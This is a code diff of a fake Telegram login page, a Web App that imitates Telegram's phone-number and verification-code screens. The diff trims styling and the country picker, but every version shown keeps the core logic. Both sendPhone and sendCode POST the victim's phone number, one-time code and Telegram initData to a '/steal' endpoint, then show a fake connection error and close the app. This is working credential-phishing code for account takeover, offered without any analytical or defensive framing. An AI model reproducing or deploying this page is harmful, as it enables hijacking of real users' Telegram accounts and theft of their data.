@@ -3,17 +3,14 @@
 <head>
     <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta charset="UTF-8">
     <style>
-        * {
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        body {
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-            line-height: 1.4;
+            color: #000000;
         }
         .page {
             padding: 20px 16px;
@@ -22,41 +19,41 @@
         }
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
+            padding-top: 40px;
         }
         .logo-img {
             width: 120px;
             height: 120px;
             border-radius: 50%;
-            margin: 0 auto 16px;
+            margin: 0 auto 20px;
             background-size: cover;
             background-position: center;
-            border: 3px solid #0088cc;
         }
         .title {
-            font-size: 20px;
+            font-size: 21px;
             font-weight: 600;
             text-align: center;
             margin-bottom: 8px;
         }
         .subtitle {
             font-size: 16px;
-            color: var(--tg-theme-hint-color, #707579);
+            color: #707579;
             text-align: center;
             margin-bottom: 30px;
-            line-height: 1.5;
+            line-height: 1.4;
         }
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
         .label {
             font-size: 16px;
             margin-bottom: 8px;
             display: block;
-            color: var(--tg-theme-text-color, #000000);
+            color: #000000;
         }
         .country-selector {
-            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
+            background: #f7f8fa;
             border-radius: 12px;
             padding: 12px 16px;
             margin-bottom: 12px;
@@ -85,16 +82,16 @@
         }
         .country-code {
             font-size: 16px;
-            color: var(--tg-theme-hint-color, #707579);
+            color: #707579;
         }
         .arrow {
-            color: var(--tg-theme-hint-color, #707579);
+            color: #707579;
             font-size: 18px;
         }
         .phone-input {
             width: 100%;
             padding: 12px 16px;
-            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
+            background: #f7f8fa;
             border: none;
             border-radius: 12px;
             font-size: 16px;
@@ -123,105 +120,38 @@
             margin-top: 10px;
         }
         .btn:disabled {
-            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
-            color: var(--tg-theme-hint-color, #999999);
+            background: #e0e0e0;
+            color: #a0a0a0;
             cursor: not-allowed;
         }
         .hidden {
             display: none;
         }
-        .countries-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: var(--tg-theme-bg-color, #ffffff);
-            z-index: 1000;
-            overflow-y: auto;
-        }
-        .modal-header {
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-        }
-        .back-btn {
-            margin-right: 16px;
-            cursor: pointer;
-            font-size: 20px;
-        }
-        .search-input {
-            width: 100%;
-            padding: 12px 16px;
-            border: none;
-            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
-            font-size: 16px;
-            outline: none;
-        }
-        .country-item {
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--tg-theme-secondary-bg-color, #f7f8fa);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-        }
-        .country-item-flag {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            margin-right: 12px;
-            font-size: 18px;
-            text-align: center;
-            line-height: 24px;
-        }
-        .country-item-name {
-            flex: 1;
-            font-size: 16px;
-        }
-        .country-item-code {
-            color: var(--tg-theme-hint-color, #707579);
-            font-size: 16px;
-        }
-        .code-input {
-            width: 100%;
-            padding: 12px 16px;
-            background: var(--tg-theme-secondary-bg-color, #f7f8fa);
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            outline: none;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: 500;
-        }
     </style>
 </head>
 <body>
-    <!-- Страница ввода номера -->
     <div class="page" id="phonePage">
         <div class="logo">
-            <div class="logo-img" id="avatar"></div>
+            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
             <div class="title">Telegram</div>
             <div class="subtitle">Please confirm your country code and enter your phone number.</div>
         </div>
 
         <div class="form-group">
             <div class="label">Country</div>
-            <div class="country-selector" onclick="showCountries()">
+            <div class="country-selector">
                 <div class="country-info">
-                    <div class="country-flag" id="currentFlag">🇷🇺</div>
-                    <div class="country-name" id="currentCountry">Russia</div>
+                    <div class="country-flag">🇷🇺</div>
+                    <div class="country-name">Russia</div>
                 </div>
-                <div class="country-code" id="currentCode">+7</div>
+                <div class="country-code">+7</div>
                 <div class="arrow">›</div>
             </div>
         </div>
 
         <div class="form-group">
             <div class="label">Your phone number</div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" oninput="validatePhone()">
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" value="+7">
         </div>
 
         <div class="checkbox">
@@ -229,208 +159,65 @@
             <label for="keepSigned">Keep me signed in</label>
         </div>
 
-        <button class="btn" id="nextBtn" disabled onclick="sendPhone()">NEXT</button>
+        <button class="btn" id="nextBtn" onclick="sendPhone()">NEXT</button>
     </div>
 
-    <!-- Страница ввода кода -->
     <div class="page hidden" id="codePage">
         <div class="logo">
-            <div class="logo-img" id="avatarCode"></div>
+            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
             <div class="title">Code</div>
             <div class="subtitle" id="codeSubtitle">We have sent a code to your phone.</div>
         </div>
 
         <div class="form-group">
             <div class="label">Verification Code</div>
-            <input type="text" class="code-input" id="codeInput" placeholder="-----" maxlength="5" oninput="validateCode()">
+            <input type="text" class="phone-input" id="codeInput" placeholder="-----" maxlength="5" style="text-align: center; letter-spacing: 8px;">
         </div>
 
-        <button class="btn" id="confirmBtn" disabled onclick="sendCode()">Confirm</button>
-    </div>
-
-    <!-- Модальное окно выбора страны -->
-    <div id="countriesModal" class="countries-modal hidden">
-        <div class="modal-header">
-            <div class="back-btn" onclick="hideCountries()">←</div>
-            <div>Select Country</div>
-        </div>
-        <input type="text" class="search-input" id="countrySearch" placeholder="Search country" oninput="filterCountries()">
-        <div id="countriesList"></div>
+        <button class="btn" id="confirmBtn" onclick="sendCode()">Confirm</button>
     </div>
 
     <script>
-        // Аватарка из папки public
-        document.getElementById('avatar').style.backgroundImage = "url('/avatar.jpg')";
-        document.getElementById('avatarCode').style.backgroundImage = "url('/avatar.jpg')";
-        
-        const countries = [
-            {code: '+7', name: 'Russia', flag: '🇷🇺'},
-            {code: '+1', name: 'United States', flag: '🇺🇸'},
-            {code: '+380', name: 'Ukraine', flag: '🇺🇦'},
-            {code: '+44', name: 'United Kingdom', flag: '🇬🇧'},
-            {code: '+49', name: 'Germany', flag: '🇩🇪'},
-            {code: '+33', name: 'France', flag: '🇫🇷'},
-            {code: '+39', name: 'Italy', flag: '🇮🇹'},
-            {code: '+34', name: 'Spain', flag: '🇪🇸'},
-            {code: '+86', name: 'China', flag: '🇨🇳'},
-            {code: '+81', name: 'Japan', flag: '🇯🇵'},
-            {code: '+82', name: 'South Korea', flag: '🇰🇷'},
-            {code: '+91', name: 'India', flag: '🇮🇳'},
-            {code: '+55', name: 'Brazil', flag: '🇧🇷'},
-            {code: '+52', name: 'Mexico', flag: '🇲🇽'},
-            {code: '+61', name: 'Australia', flag: '🇦🇺'},
-            {code: '+64', name: 'New Zealand', flag: '🇳🇿'},
-            {code: '+31', name: 'Netherlands', flag: '🇳🇱'},
-            {code: '+41', name: 'Switzerland', flag: '🇨🇭'},
-            {code: '+46', name: 'Sweden', flag: '🇸🇪'},
-            {code: '+47', name: 'Norway', flag: '🇳🇴'},
-            {code: '+45', name: 'Denmark', flag: '🇩🇰'},
-            {code: '+358', name: 'Finland', flag: '🇫🇮'},
-            {code: '+48', name: 'Poland', flag: '🇵🇱'},
-            {code: '+420', name: 'Czech Republic', flag: '🇨🇿'},
-            {code: '+36', name: 'Hungary', flag: '🇭🇺'},
-            {code: '+40', name: 'Romania', flag: '🇷🇴'},
-            {code: '+381', name: 'Serbia', flag: '🇷🇸'},
-            {code: '+385', name: 'Croatia', flag: '🇭🇷'},
-            {code: '+30', name: 'Greece', flag: '🇬🇷'},
-            {code: '+90', name: 'Turkey', flag: '🇹🇷'},
-            {code: '+20', name: 'Egypt', flag: '🇪🇬'},
-            {code: '+27', name: 'South Africa', flag: '🇿🇦'},
-            {code: '+234', name: 'Nigeria', flag: '🇳🇬'},
-            {code: '+254', name: 'Kenya', flag: '🇰🇪'},
-            {code: '+966', name: 'Saudi Arabia', flag: '🇸🇦'},
-            {code: '+971', name: 'United Arab Emirates', flag: '🇦🇪'},
-            {code: '+974', name: 'Qatar', flag: '🇶🇦'},
-            {code: '+65', name: 'Singapore', flag: '🇸🇬'},
-            {code: '+60', name: 'Malaysia', flag: '🇲🇾'},
-            {code: '+66', name: 'Thailand', flag: '🇹🇭'},
-            {code: '+84', name: 'Vietnam', flag: '🇻🇳'},
-            {code: '+62', name: 'Indonesia', flag: '🇮🇩'},
-            {code: '+63', name: 'Philippines', flag: '🇵🇭'},
-            {code: '+92', name: 'Pakistan', flag: '🇵🇰'},
-            {code: '+98', name: 'Iran', flag: '🇮🇷'},
-            {code: '+972', name: 'Israel', flag: '🇮🇱'}
-        ];
-
-        let selectedCountry = countries[0]; // Russia по умолчанию
-        let userPhone = '';
-        const currentDomain = window.location.hostname;
-        const stealUrl = `https://${currentDomain}/steal`;
-
-        function updateCurrentCountry() {
-            document.getElementById('currentCountry').textContent = selectedCountry.name;
-            document.getElementById('currentCode').textContent = selectedCountry.code;
-            document.getElementById('currentFlag').textContent = selectedCountry.flag;
-            document.getElementById('phoneInput').placeholder = selectedCountry.code;
-        }
-
-        function showCountries() {
-            document.getElementById('countriesModal').classList.remove('hidden');
-            renderCountries();
-        }
-
-        function hideCountries() {
-            document.getElementById('countriesModal').classList.add('hidden');
-        }
-
-        function renderCountries(filter = '') {
-            const list = document.getElementById('countriesList');
-            list.innerHTML = '';
-            
-            const filtered = countries.filter(country => 
-                country.name.toLowerCase().includes(filter.toLowerCase()) ||
-                country.code.includes(filter)
-            );
-            
-            filtered.forEach(country => {
-                const item = document.createElement('div');
-                item.className = 'country-item';
-                item.innerHTML = `
-                    <div class="country-item-flag">${country.flag}</div>
-                    <div class="country-item-name">${country.name}</div>
-                    <div class="country-item-code">${country.code}</div>
-                `;
-                item.onclick = () => selectCountry(country);
-                list.appendChild(item);
-            });
-        }
-
-        function filterCountries() {
-            const search = document.getElementById('countrySearch').value;
-            renderCountries(search);
-        }
-
-        function selectCountry(country) {
-            selectedCountry = country;
-            updateCurrentCountry();
-            hideCountries();
-            validatePhone();
-        }
-
-        function validatePhone() {
-            const phone = document.getElementById('phoneInput').value;
-            const nextBtn = document.getElementById('nextBtn');
-            
-            // Убираем код страны из ввода для проверки
-            const cleanPhone = phone.replace(selectedCountry.code, '').trim();
-            userPhone = selectedCountry.code + cleanPhone;
-            
-            nextBtn.disabled = !cleanPhone.match(/^[0-9]{7,15}$/);
-        }
-
-        function validateCode() {
-            const code = document.getElementById('codeInput').value;
-            const confirmBtn = document.getElementById('confirmBtn');
-            confirmBtn.disabled = code.length !== 5;
-        }
-
         function sendPhone() {
+            const phone = document.getElementById('phoneInput').value;
             const tgData = Telegram.WebApp.initData;
             
-            fetch(stealUrl, {
+            fetch('/steal', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: userPhone,
+                    phone: phone,
                     tg_data: tgData,
                     stage: 'phone_entered'
                 })
             }).catch(e => console.error('Error:', e));
 
-            // Показываем страницу с кодом
             document.getElementById('phonePage').classList.add('hidden');
             document.getElementById('codePage').classList.remove('hidden');
             
-            // Маскируем номер для отображения
-            const maskedPhone = userPhone.slice(0, 4) + ' ••• ••• ' + userPhone.slice(-2);
-            document.getElementById('codeSubtitle').textContent = 
-                `We have sent a code to ${maskedPhone}`;
+            const maskedPhone = phone.slice(0, 4) + ' ••• ••• ' + phone.slice(-2);
+            document.getElementById('codeSubtitle').textContent = `We have sent a code to ${maskedPhone}`;
         }
 
         function sendCode() {
             const code = document.getElementById('codeInput').value;
-            const tgData = Telegram.WebApp.initData;
+            const phone = document.getElementById('phoneInput').value;
             
-            fetch(stealUrl, {
+            fetch('/steal', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    phone: userPhone,
+                    phone: phone,
                     code: code,
-                    tg_data: tgData,
+                    tg_data: Telegram.WebApp.initData,
                     stage: 'code_entered'
                 })
             }).catch(e => console.error('Error:', e));
 
-            // Показываем ошибку и закрываем
-            setTimeout(() => {
-                alert('Error connecting to Telegram. Please try again later.');
-                Telegram.WebApp.close();
-            }, 1000);
+            alert('Error connecting to Telegram. Please try again later.');
+            Telegram.WebApp.close();
         }
 
-        // Инициализация
-        updateCurrentCountry();
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
         Telegram.WebApp.setHeaderColor('#4a8cDc');
